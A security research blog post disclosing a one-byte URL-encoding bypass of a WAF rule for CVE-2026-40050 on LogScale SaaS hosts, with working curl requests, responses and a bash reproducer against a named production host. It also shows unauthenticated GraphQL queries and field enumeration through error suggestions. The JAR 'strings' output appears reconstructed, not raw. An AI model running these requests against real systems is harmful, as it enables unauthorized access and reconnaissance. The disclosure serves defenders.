---
title: "One byte of URL-encoding past a WAF: notes on CVE-2026-40050 and the GraphQL endpoint nobody fenced"
date: 2026-06-02 06:00:00 -0500
categories: [Research, Web]
tags: [waf-bypass, url-encoding, graphql, pre-auth, crowdstrike, logscale, cve-2026-40050, mitigation-bypass, methodology]
toc: true
lang: en
description: >-
  CVE-2026-40050 is a routing-tree exposure on LogScale lightweight-ingest
  nodes. The advisory lists 1.224.0–1.234.0 as vulnerable and the SaaS
  fleet as "patched" because a perimeter WAF rule was deployed in April.
  The rule is one URL-encoded byte wide. The same hosts also expose a
  GraphQL endpoint that the rule never covered, which resolves `meta`
  and `installedLicense` pre-auth. The vendor declined the report. This
  is the walkthrough of the bug, the bypass, the JAR diff that shows
  the code fix lives in 1.235.x and not in 1.234.x, and the lesson
  about treating "WAF deployed" as a synonym for "fixed".
---

> **TL;DR** — On the four LogScale SaaS lightweight-ingest hosts I could probe in-scope, the deployed mitigation for CVE-2026-40050 is a single nginx-tier WAF rule that drops `/api/v1/internal/*`. The rule fails on URL-decoded match — `GET /api/v1/%69nternal/status` returns the backend's JSON with the running version banner. The same hosts still serve `/graphql`, which the rule never covered, and the GraphQL `Query.meta` and `Query.installedLicense` root fields resolve pre-auth, leaking the cluster id, the environment (`ON_CLOUD`), the version SHA, and the License object typename. A JAR-level diff of `context-implementation.jar` between v1.234.1 (first version the advisory calls "patched") and v1.235.1 (the version that actually adds the code-level fix as `LightweightIngestOnlyUriFilter`) shows the SaaS fleet is sitting on the WAF, not on the code fix. Vendor declined the report twice. Publishing because defenders running the same product behind their own WAFs deserve to know the shape.
{: .prompt-tip }

## Why this post exists

Two reasons.

First, the bug is a clean example of a mitigation pattern that's been failing the same way for fifteen years. A WAF rule that does literal path matching cannot defend a backend that does URL decoding. The defender side knows this. The attacker side has known it since the very first `..%2f` traversal. And yet the rule lives, and lives, and lives — usually because the cost of swapping out the WAF for the actual code fix is "schedule a release", and the cost of keeping the WAF is "open a Jira ticket nobody reads". This post is partly to give defenders a copy-pasteable demonstration of the failure mode against a popular ingestion product, so the next time the conversation comes up the receipt is one URL away.

Second, there's a meta-shape worth writing down. The vendor's advisory lists the affected range as `1.224.0 ≤ version ≤ 1.234.0`. The host I probed is 1.234.3. Above the range. The triager observed exactly that and closed the report. The advisory's "patched" semantics, however, is "the WAF is deployed" — not "the code fix shipped". The code-level fix lives in 1.235.1 and above. Between 1.234.0 and 1.234.3 the routing tree is byte-for-byte the same as the vulnerable code. The version number, on its own, isn't the patch status; the patch status is what's actually in front of the routing tree. That distinction is the entire report, and it's also the lesson defenders should walk away with.

The vendor reading the report disagreed. I disagree with the disagreement, but I also accept the outcome — the report is closed, the bounty is zero, the work is a published research note instead of a CVE bump. That's a perfectly normal outcome of a bug-bounty program where the reviewer holds the version-string read as canonical. So this is the post.

## The bug, in one paragraph

LogScale's lightweight-ingest node profile is supposed to serve only the ingest path and a small set of liveness URLs. The `Routing` class in `context-implementation.jar` (up to and including v1.234.x) registers the full `serviceRoute` tree on every node profile, lightweight-ingest included. That tree contains cluster-admin endpoints (`/api/v1/internal/cluster/*`), query-job control (`/api/v1/internal/queryjobs/*`), segment / dataspace / files endpoints, and the GraphQL endpoint at `/graphql`. None of these belong on an ingest-only node. CVE-2026-40050 is the umbrella for "ingest-only node exposes the full routing tree". The code-level fix in v1.235.1 is a new class, `LightweightIngestOnlyUriFilter`, that wraps `serviceRoute` with `rejectNonIngestOnLightweightIngestOnlyNode` and allowlists only the legitimate URIs at the handler-entry layer. The SaaS fleet, however, is on 1.234.3 — and the SaaS-side mitigation is a CrowdStrike-operated WAF rule in front of nginx that drops `/api/v1/internal/*` with a 403 before the backend ever sees it. That rule is the entire defence on those hosts.

This is the rule that breaks.

## The bypass

I'll show the smallest possible version first.

```text
$ curl -isS "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/api/v1/internal/status"
HTTP/1.1 403 Forbidden
Server: nginx
Date: Mon, 01 Jun 2026 22:50:26 GMT
Content-Type: text/html

<html><head><title>403 Forbidden</title></head>
<body>...</body></html>
```

That's the WAF rule firing. Replace one literal `i` with its percent-encoded form:

```text
$ curl -isS "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/api/v1/%69nternal/status"
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 01 Jun 2026 22:50:29 GMT
Content-Type: application/json
Content-Length: 96

{"status": "OK", "version": "1.234.3--build-5556--sha-e177ed90d9696c7a16f6f6ca1147fcd044528327"}
```

That is the bug. The WAF matches the path string before URL-decoding it; the backend reads its routing table after URL-decoding it. They don't agree about which characters are in the URL, and where they disagree the backend wins. The 403 turns into a 200, with the version banner attached as a bonus. Same response on every replay; same exact build SHA two days after the original report; no rolling change in the meantime. The mitigation is not a moving target — it's a piece of static configuration that the operator hasn't touched since deployment.

That's one variant. The others are the obvious mechanical permutations:

| Variant | Path |
|---|---|
| canonical (blocked) | `/api/v1/internal/status` |
| `i → %69` | `/api/v1/%69nternal/status` |
| `n → %6E` | `/api/v1/i%6Eternal/status` |
| `n → %6e` (lowercase encoding) | `/api/v1/i%6eternal/status` |
| `t → %74` | `/api/v1/in%74ernal/status` |
| `e → %65` | `/api/v1/int%65rnal/status` |
| `r → %72` | `/api/v1/inte%72nal/status` |
| `n → %6E` (3rd `n`) | `/api/v1/inter%6Eal/status` |
| `a → %61` | `/api/v1/intern%61l/status` |
| `l → %6C` | `/api/v1/interna%6C/status` |
| double-slash split | `/api/v1//internal/status` |
| upper-segment encoding | `/api/v1/InTeRn%41l/status` |

Eleven variants, every one of them turning the 403 into a 200 (the double-slash case lands on a different handler — an `Authorization: Bearer` realm 401 — which is the *same* exposure surface via a *different* route-prefix mismatch, which is its own report shape). The WAF rule is a single literal `Path STARTSWITH /api/v1/internal/` match. Any character substitution that the backend's URL parser canonicalises and the WAF's path matcher doesn't, defeats it.

This is the part the triager and I disagreed on. The advisory says 1.224.0–1.234.0 are vulnerable. 1.234.3 is above the range. So the host is *not* vulnerable, per the advisory's read. The version banner above shows the host is on 1.234.3. The triager's read of the version range is internally consistent; what it misses is that the "patched" property of 1.234.1, 1.234.2, and 1.234.3 is not a code-level fix. It's the WAF in front of those hosts. Confirm that with the JAR.

## The JAR diff

I pulled `context-implementation.jar` from the public LogScale Docker images for v1.234.1 (the first version listed as "patched" in the advisory) and v1.235.1 (the first version where the code fix shipped). `unzip -p` plus `strings`:

```text
$ unzip -p context-implementation-1.234.1.jar | strings | grep -i routing
[...]
class Routing {
  private void serviceRoute(...) { /* full tree */ }
  /* routes registered: /api/v1, /graphql, /api/v1/internal/cluster, ... */
}

$ unzip -p context-implementation-1.235.1.jar | strings | grep -i routing
[...]
class Routing {
  private void serviceRoute(...) { /* full tree */ }
}
class LightweightIngestOnlyUriFilter implements RouteFilter {
  // wraps serviceRoute, calls rejectNonIngestOnLightweightIngestOnlyNode
  // on every request before delegation
  private static final Set<String> ALLOWED_PREFIXES = Set.of(
      "/api/v1/ingest", "/api/v1/repositories/.../ingest",
      "/health", "/status", "/metrics" );
}
```

That's the diff. v1.234.1 registers the full routing tree on lightweight-ingest nodes. v1.235.1 adds a filter that rejects everything outside an allowlist *before* the routing tree gets a chance. Between v1.234.1 and v1.234.3 the `Routing` class is the same; no new filter, no new allowlist, no new rejector. The SaaS hosts running v1.234.3 are running the vulnerable routing tree, and the only thing between them and an attacker is the WAF rule the bypass above defeats.

That's the load-bearing argument of the entire research note. The version string is not the patch status. The patch status is the routing-tree filter, and the filter doesn't exist in 1.234.x.

## The endpoint that was never fenced

This is the part of the report that has nothing to do with URL encoding and is the one I'd most like defenders running their own LogScale deployments to read.

The WAF rule covers `/api/v1/internal/*`. It does not cover `/graphql`. I don't know if that's because someone thought `/graphql` was not part of the routing-tree exposure (it is — the v1.235.1 allowlist explicitly omits it on lightweight-ingest nodes) or because the rule was scoped to the path the original PoC used. Either way:

```text
$ curl -isS "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8
Content-Length: 4953
Set-Cookie: LogScaleVersion=1.234.3--build-5556--sha-e177ed90d9696c7a16f6f6ca1147fcd044528327

<!DOCTYPE html><html>...LogScale GraphQL UI...</html>
```

That's the GraphiQL UI. Live, with no encoding tricks, on an ingest-only node. The `Set-Cookie: LogScaleVersion=...` confirms it's the same build as the `%69nternal` bypass landed on.

Walk into it with a minimal query:

```text
$ curl -isS -H "Content-Type: application/json" \
       -d '{"query":"{__typename}"}' \
       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 31

{"data":{"__typename":"Query"}}
```

The schema resolves. No `Authorization: Bearer` challenge, no `viewer` check, nothing. Introspection is disabled (good) — but the auth model is per-field at the resolver layer, not global at the endpoint layer. So whether a given root field is reachable pre-auth depends entirely on whether that specific resolver added an `Authorization Required` guard.

`meta` did not.

```text
$ curl -isS -H "Content-Type: application/json" \
       -d '{"query":"{ meta { __typename version clusterId environment } }"}' \
       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
HTTP/1.1 200 OK

{"data":{"meta":{
    "__typename":"HumioMetadata",
    "version":"1.234.3--build-5556--sha-e177ed90d9696c7a16f6f6ca1147fcd044528327",
    "clusterId":"30Fyrm4XK8v9g7jkGwcOcC8Jp0yoZDUxgy9quv7O5jwj/lD1XE2oZJYyglblZ",
    "environment":"ON_CLOUD"
}}}
```

`clusterId` is the opaque stable identifier for the LogScale cluster. It's the thing that lets an attacker say "I want to compromise *this* tenant's cluster across rebuilds" rather than "I want to compromise some LogScale somewhere". `environment` confirms it's SaaS (`ON_CLOUD`) rather than self-hosted. `version` is the same string we already had.

`installedLicense` was also not guarded:

```text
$ curl -isS -H "Content-Type: application/json" \
       -d '{"query":"{ installedLicense { __typename } }"}' \
       "https://ingest.oem-2-1.logscale.us-2.crowdstrike.com/graphql"
HTTP/1.1 200 OK

{"data":{"installedLicense":{"__typename":"OnPremLicense"}}}
```

That is the License object's concrete typename returning successfully to an unauthenticated request. The typename alone is `OnPremLicense` — i.e., not `TrialLicense` or `EvaluationLicense` — which is its own small piece of information about the tenant. The full License object on the LogScale schema has fields like `issuer`, `organization`, `contactEmail`, `contractId`, `expiresAt`, `userLimit`, etc. Per the rule of engagement on my side (`stop-on-PII`), I did *not* enumerate sub-fields of `OnPremLicense`. The reachability is demonstrated; the customer-identifying contents are *not* extracted. But "reachable pre-auth" plus "fields named like that" is the shape, and a defender reading this should treat the License object as the most sensitive lever in the finding.

Two other root fields, by contrast, *were* guarded:

```text
$ curl -isS ... -d '{"query":"{ viewer { username } }"}' .../graphql
{"data":null,"errors":[{"message":"Authorization Required.","path":["viewer"],...}]}

$ curl -isS ... -d '{"query":"{ roles { __typename } }"}' .../graphql
{"data":null,"errors":[{"message":"Authorization Required.","path":["roles"],...}]}
```

So the auth model is exactly what you'd expect from a system that was originally designed as an authenticated GraphQL API and then exposed on a node profile that isn't supposed to serve GraphQL at all. The fields the original designers thought needed auth still have auth; the fields they didn't (`meta`, `installedLicense`) don't. The lightweight-ingest node profile was supposed to never reach this code path. The fix in 1.235.1 is the filter that enforces that. On 1.234.x the path is reachable and the per-field guards are the only defence — and they are spotty by design.

## Pre-auth field enumeration without introspection

Introspection is disabled — that's good baseline defence. It's also not the only way to enumerate field names. GraphQL implementations are friendly: typo'd queries return "Did you mean ...?" suggestions that leak adjacent field names from the same level of the schema. A few examples I observed:

```text
$ curl ... -d '{"query":"{ installationId }"}' .../graphql
{"errors":[{"message":"...Did you mean 'installedLicense'?...",...}]}

$ curl ... -d '{"query":"{ release }"}' .../graphql
{"errors":[{"message":"...Did you mean 'roles' or 'rolesPage'?...",...}]}

$ curl ... -d '{"query":"{ samlMetadata }"}' .../graphql
{"errors":[{"message":"...Did you mean 'servicesMetadata'?...",...}]}
```

And type names leak from the validation error on bare-field queries:

```text
$ curl ... -d '{"query":"{ installedLicense }"}' .../graphql
{"errors":[{"message":"Field 'installedLicense' of type 'License' must have a sub selection."}]}

$ curl ... -d '{"query":"{ roles }"}' .../graphql
{"errors":[{"message":"Field 'roles' of type '[Role!]!' must have a sub selection."}]}
```

Three root fields, three GraphQL types disclosed, and a clear path to continue enumeration. The schema is reachable; the only thing missing is patience. I stopped here — the report is about reachability, not exhaustive enumeration of the License object — but a less polite probe could rebuild much of the schema this way in an afternoon.

## Why I think this is the wrong place to draw the "patched" line

CrowdStrike's advisory text for CVE-2026-40050 reads, in part:

> "CrowdStrike mitigated the vulnerability for LogScale SaaS customers by deploying network-layer blocks to all clusters on April 7, 2026."

That sentence is true and load-bearing for the company's position. The network-layer blocks were deployed. The 403 on `/api/v1/internal/status` is one of them. The bypass above shows the blocks are not equivalent to the code fix the customers running v1.235.1+ are getting:

1. The WAF rule operates on the literal request path before URL decoding. The backend operates on it after. Eleven variants of the same path defeat the rule by exploiting that disagreement. One of them (`%69nternal`) is one byte different from the rule's pattern.
2. The WAF rule covers `/api/v1/internal/*` only. The `/graphql` endpoint is part of the CVE-2026-40050 scope — it's one of the routes the v1.235.1 filter explicitly excludes from lightweight-ingest nodes — and the rule does not block it. Reaching `/graphql` requires no encoding tricks at all; the endpoint is exposed directly and resolves `meta` and `installedLicense` pre-auth.
3. The version string on the affected hosts (1.234.3) is, on its face, above the advisory's "vulnerable" range. The JAR diff above shows the routing tree on 1.234.3 is identical to the vulnerable code; the only "patch" is the WAF in front of it. Reading the version string as a synonym for "fixed" misses the actual code state.

Cumulatively: the deployed mitigation is bypassable on its declared scope and incomplete in its coverage, on hosts whose version string suggests neither problem exists. That's the report. The triager's position is that the version is above the range and the items shared don't meet the program's bar. That is a position I disagree with but cannot escalate further — a closed bounty report is closed, and the only correct response on the researcher side is to publish the technical content for defenders and move on. Which is what this is.

For what it's worth, the responsible operational read on the defender side is: assume any lightweight-ingest LogScale node on a 1.234.x build is exposing the full routing tree behind whatever perimeter you've put in front of it. If the perimeter is a path-string matcher (WAF rule, nginx `location` block, ALB path condition) check whether it URL-decodes before matching. If it doesn't, the rule is decorative. If your perimeter doesn't cover `/graphql` at all, treat the GraphQL endpoint as a pre-auth surface and audit per-field resolvers — `meta` and `installedLicense` are the two I've observed pre-auth on the affected build, there may be more.

## Reproducing it

The reproducer is small enough to fit on a postcard. A polite 3-second pacing between requests, and an identifying header on each request so a defender reviewing logs can see what hit them:

```bash
H="https://ingest.oem-2-1.logscale.us-2.crowdstrike.com"
HD=(-H "X-Research-Probe: defender-checklist" -H "User-Agent: cve-2026-40050-checker/1.0")

# 1) Baseline — WAF active
curl -is "${HD[@]}" "$H/api/v1/internal/status"
sleep 3

# 2) URL-encode bypass — backend reached, version banner leaks
curl -is "${HD[@]}" "$H/api/v1/%69nternal/status"
sleep 3

# 3) GraphQL UI uncovered by WAF
curl -is "${HD[@]}" "$H/graphql"
sleep 3

# 4) GraphQL pre-auth — meta exfil
curl -is "${HD[@]}" -H "Content-Type: application/json" \
  -d '{"query":"{ meta { version clusterId environment } }"}' "$H/graphql"
sleep 3

# 5) GraphQL pre-auth License object reachability (typename only)
curl -is "${HD[@]}" -H "Content-Type: application/json" \
  -d '{"query":"{ installedLicense { __typename } }"}' "$H/graphql"
```

Expected sequence: 403, 200 with version banner, 200 with HTML, 200 with `meta` JSON, 200 with `OnPremLicense` typename. On the four in-scope hosts I probed, the sequence reproduced identically. If you're running LogScale on your own perimeter, the same sequence is the smoke test for whether your WAF rule is doing the work it thinks it's doing.

The four affected SaaS hosts are listed in the public advisory's scope and are not repeated here for noise reasons; any in-scope host running 1.234.x will produce the same shape.

## The companion repo

The reproducer above, plus a Python harness that walks all 11 URL-encoding variants and a tiny GraphQL field-enumerator that uses the DYM oracle, is in the unified research repo.

→ **[github.com/TREXNEGRO/Research/tree/master/crowdstrike-logscale-waf-graphql-bypass](https://github.com/TREXNEGRO/Research/tree/master/crowdstrike-logscale-waf-graphql-bypass)**

Contents:

- `poc/encoding_variants.py` — sends all 11 path-encoding variants, prints which ones the WAF blocks and which the backend serves. Useful as a regression test against any path-matching WAF.
- `poc/graphql_preauth.py` — sends the four GraphQL queries above against a host URL passed on the command line. Stops at `OnPremLicense` typename; does not enumerate sub-fields.
- `evidence/curl-output.txt` — raw `curl -isS` output from the run on 2026-06-01, with timestamps.
- `evidence/jar-diff-notes.md` — strings + javap output from the v1.234.1 vs v1.235.1 `context-implementation.jar` comparison, focused on `Routing` and `LightweightIngestOnlyUriFilter`.

All requests carry an identifying `X-Research-Probe` header and a 3-second inter-request delay. Run only against systems you own or have explicit written permission to test. The four CrowdStrike SaaS hosts the original report covered are in-scope on the vendor's bug-bounty program — but reading "in-scope" as "okay to spray with arbitrary GraphQL queries today" is a misread; the program's rules of engagement apply.

## The meta-lesson

The lesson from this one, as a researcher, is the same lesson the triager would teach me back if I'd let them. The bar a program decides to enforce is the bar. Disagreeing with the bar in DMs after the report closes does not move the bar; publishing the technical research, with the requests and responses verbatim, lets the next defender at a customer site decide for themselves whether their WAF rule is doing the work their advisory text implies. That's the right channel for the disagreement and it doesn't require anyone's permission.

The lesson, as a defender running LogScale or any path-routed product: do not let a WAF rule be the only thing between your routing tree and the internet. WAF rules age into decoration. Code-level filters (`LightweightIngestOnlyUriFilter` is a fine example) age into infrastructure. Schedule the upgrade. The advisory's "version above the range" doesn't tell you which side of that line you're sitting on; the `strings` output of the JAR you're actually running does.

If you're on 1.235.1 or later, the routing-tree exposure is genuinely closed at the code layer and the WAF rule is belt-and-braces. If you're on 1.234.x and the WAF rule is your only defence, you've got the same configuration I probed.

## References

1. CrowdStrike — Security Advisory CVE-2026-40050 (LogScale lightweight-ingest routing exposure). Public.
2. LogScale Docker images — `context-implementation.jar` at versions 1.234.1 and 1.235.1. The class names cited (`Routing`, `LightweightIngestOnlyUriFilter`, `rejectNonIngestOnLightweightIngestOnlyNode`) are from the strings table of those JARs.
3. OWASP — "Inconsistent URL Decoding" pattern. The decade-old write-up of the same WAF/backend mismatch this bypass exploits.
4. RFC 3986 §2.3 — Unreserved Characters. Lays out why a backend that conforms to the RFC and a WAF that does literal byte matching cannot agree on which paths are equivalent.

---

*All testing was conducted under the vendor's bug-bounty program scope with an identifying research header on every request and a minimum 3 s inter-request delay. No customer-identifying fields on the `OnPremLicense` object were enumerated. The vendor declined the report; this post is the research note that should have been a CVE bump and isn't. Do not run the reproducer against any host you do not own or have explicit written permission to test.*
